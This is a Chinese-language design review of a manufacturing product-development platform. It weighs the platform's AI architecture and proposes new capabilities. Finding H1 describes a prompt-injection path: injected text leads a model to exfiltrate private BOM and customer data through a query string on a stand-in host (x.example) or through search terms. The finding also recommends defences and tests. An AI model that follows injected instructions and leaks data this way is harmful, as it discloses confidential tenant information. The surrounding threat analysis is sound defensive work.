# PDOS 完整设计合同评审 · AI 能力全景与增补建议

日期：2026-09-10　评审对象：[完整设计合同 v1.0](../design/2026-09-10-pdos-complete-design-contract.md)（910 行）
参照：[生命周期角色与 AI 价值](../design/2026-09-10-lifecycle-role-tasks-and-ai-value.md)、[Context/Tools/Harness 合同](../design/2026-09-10-ai-context-tools-harness-contract.md)、`server/app/ai/reach.py`、`server/app/db/schema.py`

本文是评审意见和建议，不修改合同、不勾选活动清单。标“已核对”的结论经本地代码或文档检索确认；未访问生产。

---

## 0. 结论

1. **架构方向正确，可作为基线。** “确定性引擎算数、AI 组织证据并提出候选、有权的人裁决”这条分工，特别适合制造业——日期、数量、实测值、良率都不能由模型生成。四时间真值、不可变样机配置修订、Finding 双动作、零 LLM 的故障路径，都是业内少见的严谨设计。
2. **有一个高优先级安全缺口。** D25 联网研究是“默认放行”，研究工具与私有上下文在同一个 run 中；代码只校验主机和路径，不检查搜索词和 URL 查询串，存在把 BOM 成本、客户名等信息**经 GET 请求外带**的通道（第 2 节 H1）。
3. **首个出口过重，交付风险高。** Q0（原 V0）的传递依赖包含 15 个建设项，其中包括自然语言流程配置与完整首版计划应用。单人开发背景下，建议先交付 3 条高频价值闭环。
4. **AI 能力目录偏“候选生成”，制造业特有的几条主线缺位**：认证合规、特殊特性贯通（DFMEA→PFMEA→控制计划）、统计/可靠性引擎、客户投诉与 8D、基于历史实绩的估时。第 4 节给出按优先级排序的增补清单。

## 1. 值得保留的设计亮点

| 设计 | 为什么对制造业 NPD 关键 |
|---|---|
| 确定性引擎与 LLM 分离（§11），“AI 不心算” | 齐套、成本、关键路径可复算，审计和客户质询时站得住 |
| Baseline / Forecast / Commitment / Actual 四真值（§11） | 解决“预测悄悄覆盖对客户承诺”这一最常见的项目管理失真 |
| SampleConfigurationRevision 不可变 + Run 绑定当次修订（§12.1） | 硬件测试追溯的核心：换 FW/PCB 后旧结果不能套用到新配置 |
| observed / derived / hypothesis 与 approval 两个维度（§9.1） | “已批准的估算仍是估算”，避免批准后事实性质被抹掉 |
| Finding 接受与应用分离，领域硬闸独立（§2） | 模型只能提议，不能改变正式业务事实 |
| 缺数据标 unknown，不画绿、不当 0（§11） | 管理层看板不会出现“假绿灯” |
| 具体停止原因、恢复路径、worker 错误路径零 LLM（§17、§19） | 可运维，失败时不会自己编造结果 |
| DQE/SQE/IE 前移 + ID 专项计划（§6） | 对应“设计完才发现难装、难测、供方不行”这一返工主因 |

## 2. 评审发现

### 高优先级

**H1 · 联网研究存在私有信息外带通道**（已核对）

- 位置：合同 §14 D25、§20；代码 `server/app/ai/reach.py:178-219`、`reach.py:421-430`
- 问题：`assert_url_allowed` 校验了协议、凭据、内网地址、登录路径、可执行扩展名，**但不检查查询串**；`search()` 把模型生成的查询词原样发给搜索服务商。D25 规定研究工具“对所有席位可用”，所以同一 run 的上下文里可能同时有租户私有资料（BOM 成本、客户要求、未发布规格）。
- 攻击路径：网页或上传文件中夹带注入指令 → 模型构造 `https://x.example/?d=<私有内容>` 或把私有内容写进搜索词 → GET 本身就把数据送了出去。合同“只读、无副作用”的假设不成立：**对外 GET 本身就是一次出站披露**。
- 现有测试：AT-09 只验证“注入 → 业务写穿透”，没有覆盖“注入 → 经 GET 外带”。
- 建议：
  1. 区分**研究型 run**（只有公开上下文 + 研究问题）和**私有上下文 run**，默认不允许两者在同一 run 中持有联网工具；需要合并时，由研究 run 产出 Evidence Snapshot，再交给私有 run 引用。
  2. `capture_snapshot` 只接受**搜索命中返回的 URL** 或**用户亲自提供的 URL**，不接受模型自由拼接的 URL；如需放宽，对查询串做长度/熵上限，并与本次上下文中的受限片段做匹配拦截。
  3. 搜索词经过出站投影：与上下文中受限片段做子串/相似度检查，命中则拒绝并记 `scope_denied`。
  4. AT-09 增加两个负例：“注入导致私有数据进入 URL 查询串”和“进入搜索词”。

**H2 · 首个出口 Q0 过重，交付节奏风险**（已核对依赖）

- 位置：附录 B（Q0 依赖 N0-01、N0-02、N0-05、N3-09、N3-10）
- 传递闭包：N0-01~06、N1-01、N2-01~04、N3-01、N3-09、N3-10、N4-01，共 **15 个建设项**。其中包括自然语言流程配置（N3-09）、首版计划的审阅与独立应用（N2-04），以及立项前工作区（N1-01，经由 N2-03 引入）。
- 问题：Q0 名为“合同与试点冻结出口”，却要求先实现多项高级能力。52 个建设项由一人开发，第一个真实员工反馈可能要在很久之后才出现，设计假设无法及早得到验证。
- 建议：
  1. 把 N3-09 中的“自然语言配置”拆出：Q0 只需**结构化模板配置**，自然语言配置作为后续增强。
  2. 在 N 包之外定义一条**价值切片轨**，先让 3 条高频闭环在真实员工手上跑通：
     - 测试失败 → Issue → 调查/复测 → 独立验证关闭（N4-01 + N0-04 的子集）
     - 会议转写 → 纪要/行动候选 → Task → 下次会议核对（N3-05/06 子集）
     - 报告导入 → 原值确认 → 覆盖缺项（已有 D14-02 基础）
  3. 这三条的员工主动时间与返工数据，用来校准 §23 的质量线，比等 N7-03 早得多。

**H3 · 合同没有条款 ID，无法满足自己的追溯要求**

- 位置：§24 要求“每项完成记录必须包含：合同/条款ID”；但全文只有章节号，新增要求没有稳定编号（只有附录 C 保留了旧 D/C/I 编号）。
- 影响：验收证据只能引用“§12.1 第 3 段”这类位置，修订后编号漂移，追溯链断裂。全文还大量使用“不能…不等于…”，规范性要求与解释性文字混在一起，实施时难以判断哪句必须测试。
- 建议：给每条规范性句子加 `PDOS-<节>-<序号>` 编号，用 MUST / SHOULD 区分；解释性文字移入“说明”块。可以用脚本抽取编号，生成“条款 → N 项 → 测试”矩阵。

**H4 · 27 项能力与 14 个工具之间没有覆盖矩阵，约半数能力缺少工具**

- 位置：§16 工具表与附录 A
- 按语义对照，以下能力在工具表中找不到对应的读工具或候选工具：`meeting_minutes`、`spec_bom`、`material_substitution`、`material_readiness`、`supplier_delay`、`sourcing_risk`、`decision_brief`、`market_analysis`、`opportunity_mapping`、`experiment_design`、`product_strategy`、`product_matrix`、`execution_followup`（缺四时间偏差读取）。
- 风险：§11 规定 AI 必须调用引擎，不能心算。如果没有 `kit.get_status`、`cost.compare`、`market.compute_sizing`、`opportunity.score`、`health.get` 这类**引擎只读工具**，模型要么无法完成任务，要么只能自己估算，违反合同。
- 建议：新增附录“能力 × 工具 × 引擎 × 事件触发”四列矩阵，每项能力至少对应一个读工具和一个出口（只读结果或 `propose_finding`）；缺工具的能力标“不可 live”。

### 中优先级

**M1 · 对象字典遗漏已存在或必需的对象族**（已核对）

`schema.py` 已有 `certifications`、`certification_expiry_alerts`、`complaints`、`suppliers`，但 §9.2 对象字典和 §10 状态机都没有覆盖它们。与此同时，六维健康里有 Certification 维度，12.3 节要求“重认证”，也有认证负责人角色，却没有对象合同作为支撑。以下对象同样缺少定义：

| 缺失对象 | 依据 | 建议 |
|---|---|---|
| Certification / StandardApplicability | 六维健康、PM3 认证窗口、换件重认证；代码已有表 | 补字段/状态/与 SampleConfigurationRevision 的绑定 |
| Complaint / FieldFailure | 代码已有 `complaints`；N6-05 服务反馈 | 补与规格/配置/批次/NCR 的关系 |
| Supplier / SupplierQualification | N5-04 供方工程画像；代码有 `suppliers` | 补资格状态、有效期、PPAP/样件结果 |
| Tooling（模具/治具 T0/T1/T2） | G26、IE 交付 | 补试模轮次、问题、放行状态 |
| FMEA / 特殊特性 / 控制计划 | §9.2 只有 FMEA 一行，代码无 FMEA 表 | 见第 4 节 A2 |

**M2 · 状态机表缺少最核心的对象**

§10 没有列出 Task（代码默认状态为 `'todo'`）、Risk、Meeting、Decision、Baseline/Commitment、ScheduleNode 的状态和转换。其中 Task 是十个功能轴共用的执行真值，Action 也复用 Task，最应该先冻结。

**M3 · “主动 AI”缺少事件 → 能力路由表**

§13.2 列出了事件族，附录 A 列出了能力，但没有写明哪个事件以何种去重/时限策略触发哪个能力。AI-native 的核心体验是“事情发生后 AI 已经准备好”，而这部分目前没有定义，实施时容易走向两个极端：要么全部 no-route，AI 不出声；要么大量触发，制造噪声。建议在 H4 的矩阵中加入“触发事件、合并窗口、SLA、噪声预算（每人每日上限）”。

**M4 · 双动作审阅可能导致审阅疲劳和“橡皮图章”**

每个 Finding 都需要“接受 + 独立应用”两次操作，且允许同一人办理。高频低风险候选（例如给自己追加一条待办、补一个缺失字段）会让这两次点击变成形式。建议：

- 按风险给 Finding 分级：L1（本人范围、可撤销、单对象）可在一次操作中产生两条审计记录；L2/L3（跨人、多对象、涉及硬闸）保持两个独立动作。**这一条改动了 D32 后续规则的执行形态，需要你拍板。**
- 增加橡皮图章监测：打开 diff 之前就接受、接受耗时低于 N 秒、批量接受后回滚率。

**M5 · 缺统计与可靠性确定性引擎**

合同禁止 AI 计算，但引擎清单中没有统计类引擎。PVT 良率、Cpk/Ppk、可靠性试验样本量（成功运行定理）、寿命分布（Weibull）、测试数据趋势，都是 DQE/IE 的日常判据。没有这个引擎，AI 在这些场景下只能说“无法计算”。建议增加 **Statistics & Reliability Engine**，输入原始 TestRun 指标，输出带公式版本和置信区间的结果。

**M6 · 冷启动数据不足，看板可能长期显示 unknown**

时间/容量/齐套/成本/健康引擎都依赖日历、容量、历史工期、供给快照和报价。中小制造企业刚上线时这些数据大多缺失，按“unknown 不画绿”的规则，控制塔会长期是灰色。设计本身是对的，但缺少应对计划。建议：

- 每个引擎定义“最小可用数据集”，并提供数据就绪度视图（按项目和引擎显示缺什么、谁来补）。
- 让 AI 从 Excel、邮件、周报中抽取候选数据（沿用导入的“原值预览 → 确认”流程）。

### 低优先级

- **L1 文档形态**：105 KB 单文件对业务评审人不友好。建议保持三层：业务说明（现有生命周期文档）→ 规范合同（加条款 ID）→ 参数附件（§18 预算、§20 保留期等常变的数值）。参数改动不应触发整份合同重新冻结。
- **L2 多席位讨论默认值**：D26 不设场景白名单，靠预算约束。建议新席位默认处于 shadow，只有在同样本对照中证明比单 Agent 有信息增量后才开启 live；§23 已有对照试验设计，可直接作为开启条件。
- **L3 术语混用**：Finding / Capability / lineage / lease 等术语与中文混排，建议附一张术语表，并规定员工界面只使用中文业务词。

## 3. AI 在各环节的功能全景（整理）

图例：**主动** = 事件或定时触发，AI 先准备好；**按需** = 员工发起；**候选** = 生成 Finding，需人工接受和应用；**只读** = 直接展示，无需审批。★ 为第 4 节建议新增的能力。

### 3.1 按阶段

| 阶段 | AI 主动做什么 | AI 按需做什么 | 调用的引擎 | 人负责裁决 | 能力键 |
|---|---|---|---|---|---|
| 立项前·研究 | 订阅竞品/标准/PCN 变化并生成快照；提示证据过期 | 拆研究问题、搜索取证、同口径竞品矩阵、JTBD/机会树、实验设计（只读+候选） | 市场量化、机会评分 | 研究范围、证据取舍、方向选择 | research_planning, competitor_analysis, market_analysis, opportunity_mapping, experiment_design |
| 立项前·策略/定义 | 发现定义与约束冲突 | 九区 Canvas、结构化规格（编号/单位/工况/验证法）、★适用标准清单 | 成本、★合规适用性规则 | 定义发布、商业取舍 | product_strategy, product_definition, ★compliance_planning |
| concept 立项 | ★相似项目“事前验尸”风险 | 立项材料、四专业初始计划候选、ID 专项计划、DQE/SQE/IE 约束 | 时间、资源、★参考类估时 | DCP 商业决定、执行批准 | requirement_readiness, schedule_control, ★premortem |
| planning 规格与计划 | 依赖/容量冲突提醒 | 验证矩阵候选、长周期项倒排、★需求质量检查 | 时间、容量、覆盖 | 基线批准、承诺确认 | test_quality, schedule_control |
| design 设计评审 | ID/接口变化时计算影响路径 | 规格↔BOM 矛盾、替代料对比、★评审预审检查单、★DFMEA→特殊特性候选 | 覆盖、成本、影响图 | 设计结论、接口冻结 | spec_bom, material_substitution, ★design_review_prep |
| EVT | 测试失败后自动关联样机配置/版本/历史失败 | 报告映射预览、调查/复测候选、根因假设 | 覆盖、★统计 | 实测结论、根因确认 | document_extract, test_quality, issue_verification |
| DVT | 配置变更后标出失效的旧证据 | 可靠性/认证覆盖缺口、★样本量与寿命分析解释、重认证判断 | 覆盖、★可靠性 | 定型、认证结论 | test_quality, change_impact, ★compliance_planning |
| PVT | 齐套/工装/短缺告警 | 齐套解释、催交/替代方案、★PFMEA→控制计划候选、交接缺项 | 齐套、★统计（良率/Cpk） | 放行、制造接收 | material_readiness, supplier_delay, handoff |
| MP 移交 | 遗留项到期提醒 | 交接包、结项核验、复盘预填 | Gate readiness | 逐项接收、结项 | gate_readiness, project_memory |
| 移交后反馈 | ★投诉/退货聚类并关联配置批次 | ★8D 草稿、实际结果对照原假设、矩阵空白 | 成本实绩、★统计 | 改善决定、下一版定义 | capa_recurrence, product_matrix, ★field_feedback |

### 3.2 贯穿全程的工作流

| 工作流 | AI 做什么 | 边界 |
|---|---|---|
| 个人工作 | 每日工作卡、一次输入拆成行动包、识别重复与阻塞、交接摘要 | readiness 由规则判定；执行和证据由人完成 |
| 会议与决策 | 会前资料装配、转写 → 纪要/决定/行动 diff、多立场 Brief、跟踪未执行的决定 | 会议结束不等于批准；需要执行的决定必须有回执 |
| 时间与延期 | 解释 Forecast 传播路径、恢复方案对比、★承诺达成概率 | 预测不自动改基线或承诺 |
| 变更 | 跨规格/BOM/FW/测试/认证/成本/交期组包，追踪遗漏的复验 | 客户确认不替代 ECN |
| 供应与成本 | 解释短缺和 Top Drivers，比较降本方案的代价 | 数量、单价、汇率由引擎计算，真值在 ERP |
| 知识 | 提炼经验候选、推送适用经验、找相似失败 | 人工审核后才进入正式知识，不自动改规则 |
| 管理层 | 六维健康解释、决策摘要、组合情景对比、★自然语言问答 | 健康度由证据聚合，AI 只解释 |

### 3.3 AI 的四种工作方式（与 §14 对应）

| 方式 | 典型场景 | 设计要点 |
|---|---|---|
| 固定流程，无模型 | 齐套计算、Gate readiness、提醒 | 最快、可复算；AI 不参与 |
| 单次模型 | 纪要整理、报告映射、解释偏差 | 有引用的只读结果或候选 |
| 局部工具循环 | 竞品研究、变更影响、根因调查 | 有预算和停止条件，每步形成 Observation |
| 多席位讨论 | 替代料取舍、DCP Decision Brief、冻结期例外 | 只有能带来新信息的席位才值得开 |

## 4. 可优化与建议新增的功能

排序依据：对制造业 NPD 的业务价值 × 与现有合同的契合度 × 实施成本。

### A. 建议补入能力目录（高价值）

| # | 功能 | AI 做什么 | 需要的确定性部分 | 为什么值得做 |
|---|---|---|---|---|
| A1 | **认证合规智能** `compliance_planning` | 由目标市场 × 品类 × 功能（如锂电、充气、应急启动）提出适用标准/法规候选（例如 UN38.3、IEC 62133、UL 2743、CE/FCC、RoHS/REACH，适用性须合规负责人确认）；监测标准换版；换件时判断是否需要重认证；倒排送样窗口 | 适用性规则表（版本化）、证书有效期（已有 `certification_expiry_alerts`） | 锂电类产品出口时，认证是关键路径上的常见延期原因；现有能力目录完全没有覆盖 |
| A2 | **特殊特性贯通** DFMEA → PFMEA → 控制计划 → SOP/检验 | 从 DFMEA 和历史失败中提出 CC/SC 候选；生成 PFMEA 与控制计划候选；检查每个特殊特性是否都有检验和反应计划 | 覆盖引擎扩展：特性 → 控制 → 检验的完整性检查 | 这是设计质量交接到制造质量的主线，目前只有 DFMEA 一行，PFMEA/控制计划缺位 |
| A3 | **统计与可靠性引擎 + AI 解释** | 解释良率、Cpk、Weibull、样本量结果及其含义，给出下一步建议 | Cpk/Ppk、成功运行定理样本量、Weibull 拟合、趋势检测 | 满足合同“AI 不心算”的前提下，让 DQE/IE 的核心判据可复算 |
| A4 | **参考类估时 + 进度风险** | 用相似节点的历史实绩（ID 轮次、试模 T0→T1、认证周期）给出 P50/P80，解释 Commitment 达成概率 | 历史实绩分布统计、三点估计/蒙特卡洛 | 属于确定性统计而非 ML 预测，符合“预测型 ML 另评”的边界；直接提升首版计划质量 |
| A5 | **客户投诉与 8D** `field_feedback` | 投诉/退货聚类，关联规格、样机配置、批次、供方；按 D1–D8 起草 8D；跟踪遏制时限 | 聚类结果可复现、时限计时 | 代码已有 `complaints` 表；客户对 8D 时效要求高，AI 起草节省时间明显 |
| A6 | **设计评审预审** `design_review_prep` | 按模板 + 历史失败 + DFMEA 生成评审检查单；预检 BOM↔规格↔图纸属性一致性；跟踪评审问题关闭 | 检查单模板版本、一致性规则 | 评审前收材料是最耗时的环节，也是漏项发生最多的地方 |
| A7 | **立项事前验尸** `premortem` | 立项时假设项目已失败，根据相似项目的失败、延期、CAPA 记录列出最可能的原因，并转成风险/任务候选 | 相似项目检索（知识引擎） | 利用已积累的知识，让风险识别前移到立项阶段 |

### B. 体验与效率增强

| # | 功能 | 说明 |
|---|---|---|
| B1 | **自然语言问答“问 PDOS”** | 只读回答“哪些项目 DVT 卡在认证”“X 项目本周新增了哪些风险”。前提是建立**指标语义层**（每个指标的口径、分母、来源版本），AI 只能组合已定义的指标，不能自创口径 |

| B3 | **需求质量检查** | 用 EARS 等句式规则检查可验证性、模糊词（“快速”“耐用”）、缺单位/工况，与 `requirement_readiness` 合并 |

| B5 | **数据就绪度视图** | 见 M6：按项目 × 引擎显示缺失数据、责任人和补齐入口 |
| B6 | **应该成本（should-cost）参考** | 用相似件历史报价和参数做可复算的参考价，作为 derived 证据，不替代正式报价 |
| B7 | **模具/治具生命周期** | T0/T1/T2 试模问题归纳、放行状态、对 Build 的影响；补 M1 中的 Tooling 对象 |
